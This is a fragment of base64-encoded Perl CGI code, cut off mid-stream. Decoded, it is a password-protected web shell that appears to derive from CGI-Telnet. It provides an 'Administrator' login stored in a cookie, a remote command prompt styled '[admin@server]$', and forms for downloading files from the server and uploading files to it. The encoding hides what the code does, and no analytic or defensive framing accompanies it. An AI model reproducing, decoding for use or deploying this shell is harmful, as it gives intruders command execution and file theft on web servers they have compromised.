NCjxmb250IGNvbG9yPSIjMDA5OTAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+JFNlcnZlck5hbWV+PGZvbnQgY29sb3I9IiNGMDAwMDAiPlwkPC9mb250PjwvZm9udD4gT0shIFlvdSBjYW4ga2lsbCBpdCE8L2ZvbnQ+DQo8L3RyPg0KPC90Ym9keT48L3RhYmxlPg0KPGJyPg0KDQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQpuZXcgVHlwaW5nVGV4dChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaGFjayIpLCAzMCwgZnVuY3Rpb24oaSl7IHZhciBhciA9IG5ldyBBcnJheSgiXyIsIiIpOyByZXR1cm4gIiAiICsgYXJbaS5sZW5ndGggJSBhci5sZW5ndGhdOyB9KTsNClR5cGluZ1RleHQucnVuQWxsKCk7DQoNCjwvc2NyaXB0Pg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQWRkIGh0bWwgc3BlY2lhbCBjaGFycw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEh0bWxTcGVjaWFsQ2hhcnMoJCl7DQoJbXkgJHRleHQgPSBzaGlmdDsNCgkkdGV4dCA9fiBzLyYvJmFtcDsvZzsNCgkkdGV4dCA9fiBzLyIvJnF1b3Q7L2c7DQoJJHRleHQgPX4gcy8nLyYjMDM5Oy9nOw0KCSR0ZXh0ID1+IHMvPC8mbHQ7L2c7DQoJJHRleHQgPX4gcy8+LyZndDsvZzsNCglyZXR1cm4gJHRleHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEFkZCBsaW5rIGZvciBkaXJlY3RvcnkNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBBZGRMaW5rRGlyKCQpDQp7DQoJbXkgJGFjPXNoaWZ0Ow0KCW15IEBkaXI9KCk7DQoJaWYoJFdpbk5UKQ0KCXsNCgkJQGRpcj1zcGxpdCgvXFwvLCRDdXJyZW50RGlyKTsNCgl9ZWxzZQ0KCXsNCgkJQGRpcj1zcGxpdCgiLyIsJnRyaW0oJEN1cnJlbnREaXIpKTsNCgl9DQoJbXkgJHBhdGg9IiI7DQoJbXkgJHJlc3VsdD0iIjsNCglmb3JlYWNoIChAZGlyKQ0KCXsNCgkJJHBhdGggLj0gJF8uJFBhdGhTZXA7DQoJCSRyZXN1bHQuPSI8YSBocmVmPSc/YT0iLiRhYy4iJmQ9Ii4kcGF0aC4iJz4iLiRfLiRQYXRoU2VwLiI8L2E+IjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgbWVzc2FnZSB0aGF0IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQ0Kew0KCXByaW50IDw8RU5EOw0KPGJyPkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4NCg0KUGFzc3dvcmQ6PGJyPg0KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIGZvciBsb2dnaW5nIGluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpbkZvcm0NCnsNCglwcmludCA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImxvZ2luIj4NCkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4NClBhc3N3b3JkOjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icCI+DQo8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPg0KPC9mb3JtPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludFBhZ2VGb290ZXINCnsNCglwcmludCAiPGJyPjxmb250IGNvbG9yPXJlZD5vLS0tWyAgPGZvbnQgY29sb3I9I2ZmOTkwMD5FZGl0IGJ5ICRFZGl0UGVyc2lvbiA8L2ZvbnQ+ICBdLS0tbzwvZm9udD48L2NvZGU+PC9jZW50ZXI+PC9ib2R5PjwvaHRtbD4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJldHJlaXZlcyB0aGUgdmFsdWVzIG9mIGFsbCBjb29raWVzLiBUaGUgY29va2llcyBjYW4gYmUgYWNjZXNzZXMgdXNpbmcgdGhlDQojIHZhcmlhYmxlICRDb29raWVzeyd9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgR2V0Q29va2llcw0Kew0KCUBodHRwY29va2llcyA9IHNwbGl0KC87IC8sJEVOVnsnSFRUUF9DT09LSUUnfSk7DQoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykNCgl7DQoJCSgkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29va2llKTsNCgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgc2NyZWVuIHdoZW4gdGhlIHVzZXIgbG9ncyBvdXQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ291dFNjcmVlbg0Kew0KCXByaW50ICJDb25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIExvZ3Mgb3V0IHRoZSB1c2VyIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gbG9naW4gYWdhaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQZXJmb3JtTG9nb3V0DQp7DQoJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPTtcbiI7ICMgcmVtb3ZlIHBhc3N3b3JkIGNvb2tpZQ0KCSZQcmludFBhZ2VIZWFkZXIoInAiKTsNCgkmUHJpbnRMb2dvdXRTY3JlZW47DQoNCgkmUHJpbnRMb2dpblNjcmVlbjsNCgkmUHJpbnRMb2dpbkZvcm07DQoJJlByaW50UGFnZUZvb3RlcjsNCglleGl0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGxvZ2luIHRoZSB1c2VyLiBJZiB0aGUgcGFzc3dvcmQgbWF0Y2hlcywgaXQNCiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QNCiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyDQojIHRvIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ2luIA0Kew0KCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkDQoJew0KCQlwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9JExvZ2luUGFzc3dvcmQ7XG4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyOw0KCQlwcmludCAmTGlzdERpcjsNCgl9DQoJZWxzZSAjIHBhc3N3b3JkIGRpZG4ndCBtYXRjaA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCQkmUHJpbnRMb2dpblNjcmVlbjsNCgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZA0KCQl7DQoJCQkmUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2U7DQoNCgkJfQ0KCQkmUHJpbnRMb2dpbkZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCWV4aXQ7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybQ0Kew0KCW15ICRkaXI9ICI8c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPiIuJkFkZExpbmtEaXIoImNvbW1hbmQiKS4iPC9zcGFuPiI7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICI8Zm9udCBjb2xvcj0nIzY2ZmY2Nic+W2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkPC9mb250PiAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+DQoNCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQokUHJvbXB0DQo8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNTAiIG5hbWU9ImMiPg0KPGlucHV0IGNsYXNzPSJzdWJtaXQidHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPg0KPC9mb3JtPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gZG93bmxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZpbGVEb3dubG9hZEZvcm0NCnsNCglteSAkZGlyID0gJkFkZExpbmtEaXIoImRvd25sb2FkIik7IA0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkICI7DQoJcmV0dXJuIDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImRvd25sb2FkIj4NCiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCBjbGFzcz0iZmlsZSIgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpEb3dubG9hZDogPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCg0KPC9mb3JtPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlVXBsb2FkRm9ybQ0Kew0KCW15ICRkaXI9ICZBZGRMaW5rRGlyKCJ1cGxvYWQiKTsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJCAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KJFByb21wdCB1cGxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCBjbGFzcz0iZmlsZSIgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpPcHRpb25zOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIGlkPSJ1cCIgdmFsdWU9Im92ZXJ3cml0ZSI+DQo8bGFiZWwgZm9yPSJ1cCI+T3ZlcndyaXRlIGlmIGl0IEV4aXN0czwvbGFiZWw+PGJyPjxicj4NClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPg0KDQo8L2Zvcm0+DQoNCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHRpbWVvdXQgZm9yIGEgY29tbWFuZCBleHBpcmVzLiBXZSBuZWVkIHRvDQojIHRlcm1pbmF0ZSB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5LiBUaGlzIGZ1bmN0aW9uIGlzIHZhbGlkIG9ubHkgb24gVW5peC4gSXQgaXMNCiMgbmV2ZXIgY2FsbGVkIHdoZW4gdGhlIHNjcmlwdCBpcyBydW5uaW5nIG9uIE5ULg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIENvbW1hbmRUaW1lb3V0DQp7DQoJaWYoISRXaW5OVCkNCgl7DQoJCWFsYXJtKDApOw0KCQlyZXR1cm4gPDxFTkQ7DQo8L3RleHRhcmVhPg0KPGJyPjxmb250IGNvbG9yPXllbGxvdz4NCkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29uZChzKS48L2ZvbnQ+DQo8YnI+PGZvbnQgc2l6ZT0nNicgY29sb3I9cmVkPktpbGxlZCBpdCE8L2ZvbnQ+DQpFTkQNCgl9DQp9DQoNCg0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gZGlzcGxheXMgdGhlIHBhZ2UgdGhhdCBjb250YWlucyBhIGxpbmsgd2hpY2ggYWxsb3dzIHRoZSB1c2VyDQojIHRvIGRvd25sb2FkIHRoZSBzcGVjaWZpZWQgZmlsZS4gVGhlIHBhZ2UgYWxzbyBjb250YWlucyBhIGF1dG8tcmVmcmVzaA0KIyBmZWF0dXJlIHRoYXQgc3RhcnRzIHRoZSBkb3dubG9hZCBhdXRvbWF0aWNhbGx5Lg0KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgZmlsZW5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RG93bmxvYWRMaW5rUGFnZQ0Kew0KCWxvY2FsKCRGaWxlVXJsKSA9IEBfOw0KCW15ICRyZXN1bHQ9IiI7DQoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzDQoJew0KCQkjIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyDQoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCgkJJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOw0KCQkkSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCSRyZXN1bHQgLj0gPDxFTkQ7DQpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4NCg0KSWYgdGhlIGRvd25sb2FkIGRvZXMgbm90IHN0YXJ0IGF1dG9tYXRpY2FsbHksDQo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5DbGljayBIZXJlPC9hPg0KRU5EDQoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJfQ0KCWVsc2UgIyBmaWxlIGRvZXNuJ3QgZXhpc3QNCgl7DQoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkRmlsZVVybDogJCEiOw0KCQkkcmVzdWx0IC49ICZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gcmVhZHMgdGhlIHNwZWNpZmllZCBmaWxlIGZyb20gdGhlIGRpc2sgYW5kIHNlbmRzIGl0IHRvIHRoZQ0KIyBicm93c2VyLCBzbyB0aGF0IGl0IGNhbiBiZSBkb3dubG9hZGVkIGJ5IHRoZSB1c2VyLg0KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBTZW5kRmlsZVRvQnJvd3Nlcg0Kew0KCW15ICRyZXN1bHQgPSAiIjsNCglsb2NhbCgkU2VuZEZpbGUpID0gQF87DQoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZw0KCXsNCgkJaWYoJFdpbk5UKQ0KCQl7DQoJCQliaW5tb2RlKFNFTkRGSUxFKTsNCgkJCWJpbm1vZGUoU1RET1VUKTsNCgkJfQ0KCQkkRmlsZVNpemUgPSAoc3RhdCgkU2VuZEZpbGUpKVs3XTsNCgkJKCRGaWxlbmFtZSA9ICRTZW5kRmlsZSkgPX4gIG0hKFteL15cXF0qKSQhOw0KCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7DQoJCXByaW50ICJDb250ZW50LUxlbmd0aDogJEZpbGVTaXplXG4iOw0KCQlwcmludCAiQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9JDFcblxuIjsNCgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7DQoJCWNsb3NlKFNFTkRGSUxFKTsNCgkJZXhpdCgxKTsNCgl9DQoJZWxzZSAjIGZhaWxlZCB0byBvcGVuIGZpbGUNCgl7DQoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhIjsNCgkJJHJlc3VsdCAuPSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KDQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciBkb3dubG9hZHMgYSBmaWxlLiBJdCBkaXNwbGF5cyBhIG1lc3NhZ2UNCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLg0KIyBUaGlzIGZ1bmN0aW9uIGlzIGFsc28gY2FsbGVkIHdoZW4gdGhlIHVzZXIgY2xpY2tzIG9uIHRoYXQgbGluay4gSW4gdGhpcyBjYXNlLA0KIyB0aGUgZmlsZSBpcyByZWFkIGFuZCBzZW50IHRvIHRoZSBicm93c2VyLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJlZ2luRG93bmxvYWQNCnsNCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQoJCSghJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0KCXsNCgkJJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCgl9DQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCgl7DQoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGENCiMgZmlsZSwgb3RoZXJ3aXNlIGl0IHN0YXJ0cyB0aGUgdXBsb2FkIHByb2Nlc3MuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVXBsb2FkRmlsZQ0Kew0KCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSB1cGxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQlyZXR1cm4gJlByaW50RmlsZVVwbG9hZEZvcm07DQoNCgl9DQoJbXkgJHJlc3VsdD0iIjsNCgkjIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2Vzcw0KCSRyZXN1bHQgLj0gIlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7DQoNCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkDQoJY2hvcCgkVGFyZ2V0TmFtZSkgaWYgKCRUYXJnZXROYW1lID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsNCg0KCSRUYXJnZXRGaWxlU2l6ZSA9IGxlbmd0aCgkaW57J2ZpbGVkYXRhJ30pOw0KCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KCW